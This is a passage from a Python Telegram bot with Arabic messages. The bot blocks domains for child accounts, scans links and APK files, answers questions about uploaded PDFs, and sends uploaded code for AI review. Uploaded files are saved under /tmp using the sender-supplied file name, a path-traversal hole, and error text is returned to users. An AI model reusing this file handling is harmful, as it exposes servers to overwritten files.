                urls = re.findall(r'https?://([^/\s]+)', text)
                for domain in urls:
                    if domain in blocked:
                        bot.send_message(chat_id, f"🚫 تم حظر هذا الموقع ({domain}).")
                        bot.send_message(ADMIN_ID, f"🚸 حظر موقع من الطفل {chat_id}: {domain}")
                        log_child_activity(chat_id, f"محاولة زيارة موقع محظور: {domain}")
                        return
            # فحص الروابط المشبوهة
            urls = re.findall(r'https?://[^\s]+', text)
            for url in urls:
                result, status = scan_url_real(url)
                if status in ['malicious', 'suspicious']:
                    bot.send_message(chat_id, f"🚨 <b>تحذير:</b> الرابط <code>{url}</code> قد يكون خطيراً.\n{result}")
                    bot.send_message(ADMIN_ID, f"⚠️ رابط مشبوه من {chat_id}: {url}\n{result}")
                    if device_info and "طفل" in device_info['type']:
                        log_child_activity(chat_id, f"رابط مشبوه: {url}")
                    break

        if state is None:
            bot.send_message(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في معالج النصوص: {e}")
        notify_admin(f"خطأ في معالج النصوص: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                bot.send_message(chat_id, "❌ يرجى إرسال ملف PDF صالح.")
                return

            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = f"/tmp/{file_name}"
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)

            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ فشل استخراج النص من ملف PDF، تأكد من أن الملف يحتوي على نصوص قابلة للقراءة.")
                user_states[chat_id] = None
                return

            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            bot.send_message(
                chat_id,
                f"✅ تم استخراج النص من ملف PDF بنجاح (عدد الأحرف: {len(pdf_text)}).\n\n"
                "الآن، اكتب سؤالك حول محتوى الملف الدراسي، وسأجيبك بناءً على النص المستخرج."
            )
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                bot.send_message(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = f"/tmp/{file_name}"
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            result, status = scan_apk_real(downloaded, file_name)
            bot.send_message(chat_id, f"📦 <b>نتيجة فحص APK:</b>\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                bot.send_message(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                review = ai_chat_real(f"مراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                bot.send_message(chat_id, f"🛠️ <b>مراجعة الكود:</b>\n{review}")
            except:
                bot.send_message(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            bot.send_message(chat_id, "📎 تم استلام الملف.")
        else:
            bot.send_message(chat_id, "📎 لفحص الملفات، قم بتفعيل الميزات أولاً.")

    except Exception as e:
        logger.error(f"خطأ في معالج الملفات: {e}")
        notify_admin(f"خطأ في معالج الملفات: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
                logger.info(f"تم حذف الملف المؤقت: {temp_file_path}")
            except Exception as del_err:
                logger.error(f"فشل حذف الملف المؤقت: {del_err}")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        bot.send_message(chat_id, "🖼️ تم استلام الصورة.")
    else:
        bot.send_message(chat_id, "🖼️ لفحص الصور، قم بتفعيل الميزات أولاً.")

# ===================== تشغيل البوت =====================

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, threaded=True)

def start_bot():
    logger.info("🚀 تشغيل البوت مع SQLite وFlask Hardening...")
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info(f"✅ خادم Flask يعمل على المنفذ {PORT}")

    if USE_WEBHOOK:
        webhook_url = f"{SERVER_URL}/webhook"
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=webhook_url)
        logger.info(f"✅ Webhook مضبوط على: {webhook_url}")
    else:
        while True:
            try:
                bot.polling(none_stop=True, interval=0, timeout=30)
            except Exception as e:
                logger.error(f"🔄 إعادة تشغيل البوت: {e}")
                time.sleep(5)

if __name__ == "__main__":
    start_bot()
